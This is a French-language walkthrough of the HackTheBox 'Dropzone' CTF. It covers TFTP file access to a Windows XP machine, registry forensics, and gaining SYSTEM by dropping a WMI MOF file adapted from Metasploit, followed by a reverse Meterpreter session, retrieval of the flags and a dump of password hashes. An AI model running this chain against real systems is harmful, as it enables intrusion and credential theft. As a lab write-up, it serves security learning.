# Solution du CTF Dropzone de HackTheBox

Introduction
------------

Dropzone est un autre challenge basé sur Windows hébergé sur [Hack The Box](https://www.hackthebox.eu/).  

Comme vous le verrez par la suite toute la difficulté de ce CTF se concentrait sur la connaissance d'une fonctionnalité obscure du système d'exploitation de Microsoft. Fonctionnalité qui n'a toutefois pas échappée aux experts qui ont écrit le ver Stuxnet.  

Il y a quelqu'un ?
------------------

Etant donné qu'un scan de port TCP ne remonte rien et que le challenge s'appelle Dropzone ou serait tenté d'essayer différentes techniques pour tenter de passer un firewall (fragmentation, [port source spécifique](http://devloop.users.sourceforge.net/index.php?article27/bypass-de-firewall-sur-le-port-source), flags spécifiques...) mais il n'en est rien (j'ai bien croisé un port RDP à un moment mais ça devrait être le fruit d'un autre participant).  

On aura plus de chances avec un scan UDP qui révèle un service TFTP (port standard 69).  

Reste à savoir quelle est la racine des fichiers pour le TFTP. Si on peut récupérer un fichier bien connu du système c'est gagné.  

Ça tombe bien on récupère sans problème un fichier *windows/win.ini* prouvant que tout le disque C est partagé.  

Qui plus est il semble que l'on dispose de droits privilégiés, en tout cas suffisants pour pouvoir placer un fichier dans system32 !  

```plain
tftp> put testxx.txt windows/system32/testxx.txt
Sent 6 bytes in 0.1 seconds
tftp> get windows/system32/testxx.txt
Received 6 bytes in 0.0 seconds
```

Après on n'est pas dieu non plus et on ne peut pas récupérer le contenu de la SAM car des processus systèmes utilisent le fichier.  

Toutefois les bases de registre sont la bonne direction pour récupérer des infos sur le système et aller plus loin. J'aurais bien fouillé dans les journaux d'événements mais là aussi l'accès est impossible.  

Inforensique 101
----------------

On trouve des sauvegardes des bases de registre en partie dans *windows32/system/config/regback* (j'y ait récupéré HKLM\Software) ou dans *windows/system32/config/* avec l'extension *.sav* (*system.sav*).  

Mais la vrai perle c'est bien sûr le *ntuser.dat* obtenu dans *C:\Documents and Settings\Administrator\* (je m'attendais à quelque chose de plus récent que du XP).  

On trouve ainsi une info sur le serveur TFTP dans les MRU :  

```plain
/Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/*/a,SZ,C:\Documents and Settings\Administrator\Desktop\SolarWinds-TFTP-Server.zip,
/Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/*/b,SZ,C:\Documents and Settings\Administrator\Desktop\dotnetfx35.exe,
/Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/exe/a,SZ,C:\Documents and Settings\Administrator\Desktop\dotnetfx35.exe,
/Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/zip/a,SZ,C:\Documents and Settings\Administrator\Desktop\SolarWinds-TFTP-Server.zip,
```

ainsi qu'une partie dans les *UserAssist* :  

```plain
UEME_RUNPATH:C:\Documents and Settings\Administrator\Desktop\SolarWinds-TFTP-Server\SolarWindsTFTPServer.exe
```

Il y a bien sûr les infos sur la version de l'OS dans *CurrentVersion* :  

```plain
/Microsoft/Windows NT/CurrentVersion/ProductName,SZ,Microsoft Windows XP,
/Microsoft/Windows NT/CurrentVersion/RegDone,SZ,,
/Microsoft/Windows NT/CurrentVersion/RegisteredOrganization,SZ,Microsoft Corporation,
/Microsoft/Windows NT/CurrentVersion/RegisteredOwner,SZ,Windows XP,
/Microsoft/Windows NT/CurrentVersion/SoftwareType,SZ,SYSTEM,
/Microsoft/Windows NT/CurrentVersion/CurrentVersion,SZ,5.1,
/Microsoft/Windows NT/CurrentVersion/CurrentBuildNumber,SZ,2600,
/Microsoft/Windows NT/CurrentVersion/BuildLab,SZ,2600.xpsp.080413-2111,
/Microsoft/Windows NT/CurrentVersion/CurrentType,SZ,Uniprocessor Free,
/Microsoft/Windows NT/CurrentVersion/CSDVersion,SZ,Service Pack 3,
```

On peut retrouver le nom de la machine (pas trop de surprise) via le fichier *netsetup.log* :  

```plain
atftp -g -l netsetup.log -r "windows/debug/netsetup.log" 10.10.10.90
05/09 17:20:20 NetpDoDomainJoin
05/09 17:20:20 NetpMachineValidToJoin: 'DROPZONE'
05/09 17:20:20 NetpGetLsaPrimaryDomain: status: 0x0
05/09 17:20:20 NetpMachineValidToJoin: status: 0x0
05/09 17:20:20 NetpJoinWorkgroup: joining computer 'DROPZONE' to workgroup 'HTB'
05/09 17:20:20 NetpValidateName: checking to see if 'HTB' is valid as type 2 name
05/09 17:20:23 NetpCheckNetBiosNameNotInUse for 'HTB' [ Workgroup as MACHINE]  returned 0x0
05/09 17:20:23 NetpValidateName: name 'HTB' is valid for type 2
05/09 17:20:23 NetpSetLsaPrimaryDomain: for 'HTB' status: 0x0
05/09 17:20:23 NetpJoinWorkgroup: status:  0x0
05/09 17:20:23 NetpDoDomainJoin: status: 0x0
```

Enfin dans les documents récents on peut voir une entrée énigmatique... on y reviendra ;-)   

```plain
/Software/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs/7,BINARY,2%00 %00f%00o%00r%00 %00t%00h%00e%00 %00p%00r%00i%00c%00e%00 %00o%00f%00 %001%00!%00!%00!%00!%00%00%00|%002%00%00%00%00%00%00%00%00%00%00%002 for the price of 1!!!!.lnk%00%00P%00%03%00%04%00%EF%BE%00%00%00%00%00%00%00%00%14%00%00%002%00 %00f%00o%00r%00 %00t%00h%00e%00 %00p%00r%00i%00c%00e%00 %00o%00f%00 %001%00!%00!%00!%00!%00.%00l%00n%00k%00%00%00%2C%00%00%00,
```

Malheureusement tout ça ne nous ouvre pas la porte du système... so what ? Écraser une DLL ou un exe ? Placer un fichier .job ? Sous Linux ça aurait été vite fait de récupérer une clé SSH mais là je sèche un peu.  

Sur le forum de HTB certains ont mentionné *Stuxnet*. Ce malware est bien connu pour avoir exploité des failles dans la gestion des shortcuts (fichier .LNK). Metasploit dispose de plusieurs modules pour cela mais après avoir placé des LNK piégés dans le bureau de l'administrateur, force est de constater que ce n'est pas le chemin attendu.  

Je suis alors retourné à mon idée de fichier job. Ces fichiers présents dans *c:\windows\tasks* sont des fichiers binaires qui contiennent le nom de l'utilisateur, le nom de la machine, la commande à exécuter et la date, l'heure et la fréquence de répétition de la tâche.  

J'ai reconfiguré un Windows XP dans une VM pour qu'il ait un utilisateur Administrateur avec le nom de machine DROPZONE, créé une tache appelant un reverse Meterpreter puis recopié le job et l'exe sur Dropzone... sans résultats. Je ne suis pas expert en administration Windows mais à ce que j'ai pu lire il peut être nécessaire que la machine redémarre pour voir le fichier job :(   

Master Of Flags
---------------

Finalement j'ai eu un conseil de *Elpugo* de me pencher en détails sur les fichiers MOF... Kezako ?  

J'ai pas eu besoin d'aller beaucoup plus loin que ma boîte mail pour avoir des infos sur le sujet car [ça faisait l'objet d'une newsletter HSC](http://shootingsawk.lescigales.org/HSC/lsv_WMI_MOF.txt).  

Pour résumer, les fichiers MOF permettent à des administrateurs de définir des taches qui seront lancées automatiquement lorsqu'un événement a lieu sur la machine.  

On trouve [différents exemples](https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html) de fichiers MOF qui permettent normalement l'exécution de commandes... mais tous semble échouer à cause d'une obscure erreur RPC...  

Finalement il a fallut une fois de plus s'en remettre à Metasploit [qui possède un module exploitant les fichiers MOF](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb) qui fonctionne parfaitement.  

Il suffit d'extraire le code du MOF dans le module, remplacer les variables, retirer l'échappement des backslashs et après un test local pour valider on passe à l'action :)  

```plain
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.11:80
[*] Sending stage (179779 bytes) to 10.10.10.90
[*] Meterpreter session 1 opened (10.10.14.11:80 -> 10.10.10.90:1052) at 2018-06-12 17:04:50 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2000 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings\Administrator\Desktop\flags

10/05/2018  10:10 ��    <DIR>          .
10/05/2018  10:10 ��    <DIR>          ..
10/05/2018  10:09 ��                76 2 for the price of 1!.txt
               1 File(s)             76 bytes
               2 Dir(s)   6.755.971.072 bytes free

C:\Documents and Settings\Administrator\Desktop\flags>type "2 for the price of 1!.txt"
type "2 for the price of 1!.txt"
For limited time only!

Keep an eye on our ADS for new offers & discounts!

C:\Documents and Settings\Administrator\Desktop\flags>c:\windows\temp\streams.exe -accepteula -s
c:\windows\temp\streams.exe -accepteula -s

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
   :root_txt_3316ffe05fada8f8e651931a5c45edab:$DATA 5
   :user_txt_a6a4830ddd27a1bddd59d2aaa80f7940:$DATA 5
```

Il aura bien sûr fallut uploader au préalable l'utilitaire *streams.exe* pour afficher les deux flags :)  

Et juste pour le plaisir :  

```plain
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 9909bedec93bff00d9b205b93de31b23...
/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:6cae09c57777b136ed4a95a4bc732c2b:d61cd4a1818f9bb9325441cce8278163:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:40a3676535ccf1824fd6840439038a7c:34b7ee8bb3e302babd6770f2089cb8ed:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:4eeeedd989fd7a573c93050af7af2c8a:::
```

Conclusion
----------

Un CTF original qui mettait le focus sur une fonctionnalité méconnue de Windows. Toutefois j'ai hâte de voir si d'autres participants ont trouvé des solutions alternatives :)

*Published November 03 2018 at 17:09*